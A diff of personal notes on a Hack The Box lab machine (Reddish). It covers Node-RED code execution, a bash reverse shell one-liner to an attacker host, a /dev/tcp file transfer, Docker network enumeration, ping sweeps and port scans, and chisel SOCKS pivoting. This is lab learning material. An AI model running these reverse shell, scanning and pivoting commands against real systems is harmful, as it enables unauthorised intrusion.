@@ -25,9 +25,7 @@ Beyond Root:
 - Revamp my Port-Redirection article(s), Chisel
 
 Returning to this box as I left it in a incomplete state while taking so much information away in 2022. As of 2023 I need a primer on a large potential part of OSCP, virtual and physical networking for AZ. Given this is the forth time returning to this box and the fifth time following along, I must note that I learnt so much and I am here to finish this as helped-through andmake sure port-redirection is engrained in my brain forever. I used and will use again [Ippsec Reddish Video](https://www.youtube.com/watch?v=Yp4oxoQIBAM), [0xDF write up](https://0xdf.gitlab.io/2019/01/26/htb-reddish.html), [0xDF Tunneling and Pivoting](https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html) and [0xDF using chisel with SSF](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html)
-
 As a general note to any unsuspecting readers, this a continuation of trying and so it contains me attempt to figure out were my recon is well tuned and not, but therefore there are also tangents including later additions of trying to figure out by comparison what I not doing correctly or efficiently. In hindsight and the most unhelpful statement to less experienced is that CTF are meant to be solved the pieces exist on the box to solve them, but also rabbit holes that will lead you astray, which is both something you have to learn to live and learn to overcome. There is a very steep learning curve with hacking and CTFs ramp upin a unrealistic way to taeach you a skill of avoiding the rabbit hole, but also the finding the alogorically thread and pull on it, but also collecting all the threads and the "purpose" of the machine. The latter being a SysAdmin it is easy to know that server X does Y function for a business, but when you are doing CTFs it was hard doing these alone without some these obvious to other concepts just apparent. 
-
 
 ## Recon
 
@@ -60,8 +58,9 @@ Day 2: returned it generate a new `b1a51218f30da47d4f45b52972804d1a`
 Day 3: After along time away: `695613754dfef3f53a0b18b02d805047`
 Day 4: After some practice elsewhere
 Day 5: `c811816e50d58bd34204067b8ba3ae80`
+Day 6: `c811816e50d58bd34204067b8ba3ae80`
 
-As of Day 5; I have learn so much as to why my approaches were good
+As of Day 5-; I have learn so much as to why my approaches were good
 1. Manual combing the with burp site and asking questions is really good
 1. Given time limits I was and set myself to try to expand my experience of different possiblities of problem, rushing and missing the key seems so silly, but indicative of me stress testing to push my brain to make me care a  great deal about hacking and solving boxes 
 	- Neurologically very important
@@ -92,14 +91,19 @@ TCP reply to! This is misconfiguration vulnerablity as we are affectively RCE th
 
 ![shell](shell.png)
 
-`bash -c 'bash -i >& /dev/tcp/$IP/$PORT 0>&1'`
+## Docker Foothold
 
-Even though I like ncat and netcat, I am glad to finally be prompted to use it as a file transfer mechanism instead of other tools. Similar to trying out powercat it felt fun, but also gratting a tad as I always see it on Enumeration Script scans after I run it.. but I don't check its there before file transfering.
+First one and half is a half and then get two for the two is one reverse shell rule.
+1. `bash -c 'bash -i >& /dev/tcp/$IP/$PORT 0>&1'`
 
+[Reading 0xDF try various functionality of the NodeRed application](https://0xdf.gitlab.io/2019/01/26/htb-reddish.html#code-execution--shell-in-node-red), I decided that an additional beyond root would be to do the same and the highest goal being to try to create a proxy via the NodeRED. In the beyond root section I will outline a proxy and other stuff both 0xdf and atleast one idea if I do not complete a proxy.
+
+As a Day <4 note to self: even though I like ncat and netcat, I am glad to finally be prompted to use it as a file transfer mechanism instead of other tools. Similar to trying out powercat it felt fun, but also gratting a tad as I always see it on Enumeration Script scans after I run it.. but I don't check its there before file transfering.
+
+Checking whether I can run in memory on the box:
 ![](noexecshm.png)
 
-
-WOW on the cat file transfer, I have not seen this on any OSCP cheatsheets!
+Ippsec's `cat` file transfer is OP. WOW on the cat file transfer, I have not seen this on any OSCP cheatsheets!
 ```bash
 bash -c "cat < /dev/tcp/$IP/$PORT > /tmp/LinEnum.sh"
 ```
@@ -107,14 +111,42 @@ bash -c "cat < /dev/tcp/$IP/$PORT > /tmp/LinEnum.sh"
 LinEnum finds Docker
 ![docker](weareindocker.png)
 
-## Docker Foothold
+```bash
+ls -la /
+cat /proc/1/cgroup
+# What does the network interfaces mean for routing and connectivity?
+ip a
+# How is the container connecting with other IPv4 addresses?
+cat /proc/net/arp
+
+```
+
+0xDF's network enumeration got me interested in /proc and /proc/net specifically
+```bash
+# ARP table is useful as even in the cloud Ipv4 is still prodominant
+# ARP is used to resolve IPv4 addresses, therefore addresses here are addresses that communicated to box
+cat /proc/net/arp
+```
+
+I only got the .18.0.1 - given that it is a very low address and we are not in the cloud where we assume the IaaS, PaaS, etc take many of the lower addresses and obvious not the final .255 address of the subnet - we can understand 0xDF assumption that it is a gateway address i.e an address to map out another set of address in a subnet or (V)network.
+![](nodot19.png)
+
+[/Proc.txt kernel documentation](https://www.kernel.org/doc/Documentation/filesystems/proc.txt)
+[Linux Kernel Networking](https://www.kernel.org/doc/Documentation/networking/)
+[/proc/net/tcp](https://www.kernel.org/doc/Documentation/networking/tcp.txt) - [tcp.cong.c](https://github.com/torvalds/linux/blob/master/net/ipv4/tcp_cong.c) congestion control algorhythms on a single queue, with flagging to indicate a frame state on the queue:
+- search the queue
+- locking to prevent accidental use
+- state management: thresholds and identification management
+- module management: cleanup, default or other configuration setting  for congestion control
+- congestion handling between socket and kernel
+- reinitialisation and initialation everything above but kernel and sockets
 
 Or you could manually checked the root directory for dot files and observed the `.dockerenv`, the above check for Docker contain is in the `/proc/1/cgroup`.
 ![](alwayslslainroot.png)
 
 Although it is not mentioned a good thing to then check with Docker would be IP address as it is may have its own routing configuration to the host box.
 ![docker](dockerips.png)
-Ping sweeping appears in both RedTeamFieldMnaula and Netmux operator handbook.
+Ping sweeping appears in both RedTeamFieldManual and Netmux operator handbook.
 ```bash
 for ip in $(seq 1 5); do
 	ping -c 1 172.18.0.$ip > /dev/null && echo "Online: 172.18.0.$ip"
@@ -127,9 +159,24 @@ Oneliner versions
 
 ![](pingsweepresult.png)
 
-Basic Port scanning 
 
+Oxdf better one liners
+```bash
+# The reason I copy and paste these is the output is better handled 
+# it is done in the background
+# Errors are visible
+for i in $(seq 1 254); do (ping -c 1 172.18.0.$i | grep "bytes from" | cut -d':' -f1 | cut -d' ' -f4 &); done
+
+for i in $(seq 1 254); do (ping -c 1 172.19.0.$i | grep "bytes from" | cut -d':' -f1 | cut -d' ' -f4 &); done                    
 ```
+
+Identifying other boxes on the network
+
+Fingerprinting without nmap, etc using brain and cli. 
+
+
+Port scanning
+```bash
 for port in 22 25 80 443 8080 8443; do (echo Hello > /dev/tcp/172.19.0.3/$port && echo "open - $port") 2> /dev/null; done
 
 for port in 22 25 80 443 8080 8443; do (echo Hello > /dev/tcp/172.18.0.1/$port && echo "open - $port") 2> /dev/null; done
@@ -153,7 +200,7 @@ curl http://10.10.14.109/chisel -o chisel
 ./chisel client 10.10.14.109:8888 R:socks
 proxychains nmap -sT -F 
 ```
-mout
+
 You could also do the same with the telling the entire subnet that nmap is being used with [naabu](https://github.com/projectdiscovery/naabu)  `-proxy string`  with socks5 proxy `(ip[:port] / fqdn[:port])`
 
 After researching and making go compilation and doing some of [[Hololive-Writeup]]. With shell stability in mind after returning to this machine for the third time, although I will do it this way just for my own peace on mind after, I want recall proxychaining and using chisel to the port forward to scan the subset with nmap. If we had NC we could do port scanning like this: `nc -zv 172.18.0.1 1-65535`. One thing to consider is that the noexec flag has been set on /dev/shm 
@@ -226,9 +273,60 @@ https://0xdf.gitlab.io/2019/01/26/htb-reddish.html#pivoting
       
 ## Beyond Root
 
+
+#### Omni-Tooling
+
 https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html
 https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html
 - sshuttle
 - ssh
-- Chisel
-- meterpreter portfwd
+	- 0xDF instuction 2.  Copy an ssh client to nodered, and ssh back into my kali box with a reverse tunnel.
+
+
+Back to Reddish
+- `meterpreter portfwd` with  0xDF instructions:
+1.  Get a meterpreter session with nodered, and use the `portfwd` capability to tunnel from my local box into the network (like ssh tunneling).
+
+
+#### Use Node RED to understand Virtual networking 
+
+3.  Build a listening interface (likely web) with NodeRed, and use that to tunnel traffic.
+
+https://nodered.org/docs/user-guide/
+
+1. Highest possible goal is a proxy
+
+[How to build a tcp proxy](https://robertheaton.com/2018/08/31/how-to-build-a-tcp-proxy-1/)
+```goat
+[kali] <-> [nodered] -> [X]
+	 <- [proxy back] <- 
+	 -> [tell nodered to goto [x] ->  
+```
+
+
+- ListenToKali
+-  ReplyToKali - incorrect cmd or cmd and proxied response
+
+- Recieve-CMD-ServerLogic - incorrect cmd or attempt cmd
+
+- ProxyOutBound with correct cmd
+- ProxyInbound - recieve information back from cmd ran
+
+- Proxy-Back-ServerLogic handle and return to ReplyToKali
+
+```bash
+# Kali - cmd input
+ncat -nv $ip 9000
+<cmd>
+# Listener to recieve 
+ncat -lvnp 9001
+```
+
+function block, switch per field: cmd, ip, port
+```goat
+exec (payload)->  Switch -> 
+					| 
+				return invalid command payload
+
+tcp-request - set with msg.host, msg.port
+```
